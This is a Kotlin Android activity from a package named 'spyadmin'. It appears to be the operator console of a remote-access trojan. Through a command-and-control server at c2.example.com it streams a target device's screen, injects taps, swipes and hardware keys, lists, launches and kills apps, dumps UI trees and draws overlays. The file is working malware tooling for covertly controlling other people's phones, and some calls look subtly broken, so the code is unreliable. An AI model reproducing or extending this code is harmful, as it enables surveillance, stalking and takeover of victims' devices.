package com.spyadmin

import android.app.AlertDialog
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.MotionEvent
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

class RemoteControlActivity : AppCompatActivity() {

    private val gson = Gson()
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private lateinit var agent: Agent
    private lateinit var ivScreen: ImageView
    private lateinit var tvStatus: TextView
    private lateinit var btnStartStream: Button
    private lateinit var btnStopStream: Button
    private val handler = Handler(Looper.getMainLooper())
    private var streaming = false
    private var lastTouchX = 0f
    private var lastTouchY = 0f
    private var scaleX = 1f
    private var scaleY = 1f

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_remote_control)

        agent = gson.fromJson(intent.getStringExtra("agent")!!, Agent::class.java)

        ivScreen = findViewById(R.id.ivScreen)
        tvStatus = findViewById(R.id.tvStatus)
        btnStartStream = findViewById(R.id.btnStartStream)
        btnStopStream = findViewById(R.id.btnStopStream)

        tvStatus.text = "${agent.hostname} (${agent.id.substring(0, 8)})"

        btnStartStream.setOnClickListener { startStream() }
        btnStopStream.setOnClickListener { stopStream() }

        ivScreen.setOnTouchListener { v, event ->
            handleTouch(event)
            true
        }

        findViewById<Button>(R.id.btnHome).setOnClickListener { sendKey(3) }
        findViewById<Button>(R.id.btnBack).setOnClickListener { sendKey(4) }
        findViewById<Button>(R.id.btnRecent).setOnClickListener { sendKey(187) }
        findViewById<Button>(R.id.btnPower).setOnClickListener { sendKey(26) }
        findViewById<Button>(R.id.btnVolumeUp).setOnClickListener { sendKey(24) }
        findViewById<Button>(R.id.btnVolumeDown).setOnClickListener { sendKey(25) }
        findViewById<Button>(R.id.btnOverlay).setOnClickListener { toggleOverlay() }
        findViewById<Button>(R.id.btnApps).setOnClickListener { showAppsDialog() }
        findViewById<Button>(R.id.btnUI).setOnClickListener { showUIDialog() }
    }

    private fun startStream() {
        sendTask("remote_control", mapOf("action" to "start_stream", "fps" to 20, "quality" to 80, "scale" to 0.8f)) { resp ->
            val result = gson.fromJson(resp, Map::class.java)
            if (result["status"] == "requires_projection_permission") {
                streaming = true
                pollFrames()
            }
        }
    }

    private fun stopStream() {
        streaming = false
        sendTask("remote_control", mapOf("action" to "stop_stream")) { _ -> }
    }

    private fun pollFrames() {
        if (!streaming) return
        sendTask("remote_control", mapOf("action" to "get_frame")) { resp ->
            val result = gson.fromJson(resp, Map::class.java)
            result["image"]?.let { b64 ->
                val bytes = Base64.decode(it as String, Base64.NO_WRAP)
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                runOnUiThread {
                    ivScreen.setImageBitmap(bitmap)
                    updateScale()
                }
            }
            handler.postDelayed({ pollFrames() }, 50)
        }
    }

    private fun updateScale() {
        val drawable = ivScreen.drawable
        if (drawable == null) return
        val imgW = drawable.intrinsicWidth.toFloat()
        val imgH = drawable.intrinsicHeight.toFloat()
        val viewW = ivScreen.width.toFloat()
        val viewH = ivScreen.height.toFloat()
        scaleX = imgW / viewW
        scaleY = imgH / viewH
    }

    private fun handleTouch(event: MotionEvent): Boolean {
        val x = (event.x * scaleX)
        val y = (event.y * scaleY)

        when (event.action) {
            MotionEvent.ACTION_DOWN -> {
                lastTouchX = x
                lastTouchY = y
                sendTask("remote_control", mapOf("action" to "tap", "x" to x, "y" to y)) { _ -> }
            }
            MotionEvent.ACTION_MOVE -> {
                val dx = kotlin.math.abs(x - lastTouchX)
                val dy = kotlin.math.abs(y - lastTouchY)
                if (dx > 10 || dy > 10) {
                    sendTask("remote_control", mapOf("action" to "swipe", "x1" to lastTouchX, "y1" to lastTouchY, "x2" to x, "y2" to y, "duration" to 200)) { _ -> }
                    lastTouchX = x
                    lastTouchY = y
                }
            }
            MotionEvent.ACTION_UP -> {
                val dx = kotlin.math.abs(x - lastTouchX)
                val dy = kotlin.math.abs(y - lastTouchY)
                if (dx < 10 && dy < 10) {
                    sendTask("remote_control", mapOf("action" to "tap", "x" to x, "y" to y)) { _ -> }
                }
            }
        }
        return true
    }

    private fun sendKey(keyCode: Int) {
        sendTask("remote_control", mapOf("action" to "key", "keyCode" to keyCode)) { _ -> }
    }

    private fun toggleOverlay() {
        sendTask("remote_control", mapOf("action" to "start_overlay")) { resp ->
            val result = gson.fromJson(resp, Map::class.java)
            if (result["status"] == "overlay_started") {
                sendTask("remote_control", mapOf(
                    "action" to "draw_overlay",
                    "shapes" to listOf(mapOf("type" to "circle", "x" to 500f, "y" to 500f, "radius" to 50f, "color" to 0xFF00FF00))
                )) { _ -> }
            }
        }
    }

    private fun showAppsDialog() {
        sendTask("remote_control", mapOf("action" to "list_running")) { resp ->
            val result = gson.fromJson(resp, Map::class.java)
            val apps = result["apps"] as? List<*> ?: return@sendTask
            val items = apps.map { it.toString() }.toTypedArray()
            AlertDialog.Builder(this)
                .setTitle("Running Apps")
                .setItems(items) { _, i ->
                    val app = apps[i] as Map<*, *>
                    val pkg = app["package"] as String
                    showAppOptions(pkg)
                }
                .show()
        }
    }

    private fun showAppOptions(pkg: String) {
        AlertDialog.Builder(this)
            .setTitle(pkg)
            .setItems(arrayOf("Launch", "Kill", "Get UI Tree")) { _, which ->
                when (which) {
                    0 -> sendTask("remote_control", mapOf("action" to "launch_app", "packageName" to pkg)) { _ -> }
                    1 -> sendTask("remote_control", mapOf("action" to "kill_app", "packageName" to pkg)) { _ -> }
                    2 -> sendTask("remote_control", mapOf("action" to "get_ui_tree")) { resp ->
                        val result = gson.fromJson(resp, Map::class.java)
                        showUIDialog(result["tree"] as? Map<*, *>)
                    }
                }
            }
            .show()
    }

    private fun showUIDialog(tree: Map<*, *>?) {
        AlertDialog.Builder(this)
            .setTitle("UI Tree")
            .setMessage(gson.toJson(tree))
            .setPositiveButton("OK", null)
            .show()
    }

    private fun sendTask(capability: String, args: Map<String, Any>, callback: (String) -> Unit) {
        val payload = mapOf(
            "action" to "task",
            "agent_id" to agent.id,
            "capability" to capability,
            "args" to gson.toJson(args),
            "timeout" to 30
        )
        request("POST", "/api/command", payload, callback)
    }

    private fun request(method: String, endpoint: String, body: Any, callback: (String) -> Unit) {
        val url = "https://c2.example.com:8443$endpoint"
        val requestBody = body.toJson().toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).method(method, requestBody).build()
        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                runOnUiThread { Toast.makeText(this@RemoteControlActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show() }
            }
            override fun onResponse(call: okhttp3.Call, response: Response) {
                response.body?.string()?.let { callback(it) }
            }
        })
    }
}